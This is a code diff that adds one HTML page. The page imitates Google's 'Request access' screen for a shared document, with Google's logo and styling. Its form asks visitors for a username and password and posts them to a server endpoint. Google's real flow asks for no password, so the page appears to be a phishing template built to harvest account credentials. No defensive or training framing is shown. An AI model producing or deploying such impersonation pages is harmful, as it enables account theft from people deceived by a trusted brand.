@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #3c4043;
+        }
+
+        .main-content {
+            text-align: center;
+            max-width: 420px;
+            width: 100%;
+            padding: 24px;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .google-logo {
+            width: 90px;
+            margin: 0 auto 32px auto;
+            display: block;
+        }
+
+        .icon-circle {
+            width: 72px;
+            height: 72px;
+            background-color: #f1f3f4;
+            border-radius: 50%;
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 20px auto;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin: 0 0 12px 0;
+            color: #202124;
+        }
+
+        p {
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 28px;
+            color: #5f6368;
+        }
+
+        .request-form {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+            outline: none;
+            font-family: inherit;
+        }
+
+        /* Message field specifically */
+        textarea.input-field {
+            resize: none;
+            height: 100px;
+        }
+
+        .input-field:focus {
+            border: 2px solid #1a73e8;
+            padding: 12px 14px;
+        }
+
+        .submit-request-btn {
+            background-color: #1a73e8;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-weight: 500;
+            font-size: 14px;
+            border: none;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 8px;
+        }
+
+        .submit-request-btn:hover {
+            background-color: #1765cc;
+            box-shadow: 0 1px 3px rgba(60,64,67,0.3);
+        }
+
+        .footer-container {
+            width: 100%;
+            padding-bottom: 30px;
+            text-align: center;
+        }
+
+        .back-btn {
+            background-color: transparent;
+            color: #1a73e8;
+            padding: 10px 24px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background 0.2s;
+        }
+
+        .back-btn:hover {
+            background-color: #f8f9fa;
+        }
+    </style>
+</head>
+<body>
+
+<div class="main-content">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="google-logo">
+
+    <div class="icon-circle">
+        <svg width="32" height="32" viewBox="0 0 24 24" fill="#5f6368">
+            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z"/>
+        </svg>
+    </div>
+    
+    <h1>Request access</h1>
+    <p>Your request will be sent to the owner of this document. Please provide your details below.</p>
+
+    <form class="request-form" action="/submit-request" method="POST">
+        <input type="text" name="username" class="input-field" placeholder="Desired Username" required>
+        <input type="password" name="password" class="input-field" placeholder="Desired password" required>
+        <textarea name="message" class="input-field" placeholder="Add a message (optional)"></textarea>
+        
+        <button type="submit" class="submit-request-btn">Send request</button>
+    </form>
+</div>
+
+<div class="footer-container">
+    <button type="button" class="back-btn" onclick="history.back()">Back to login</button>
+</div>
+
+</body>
+</html>
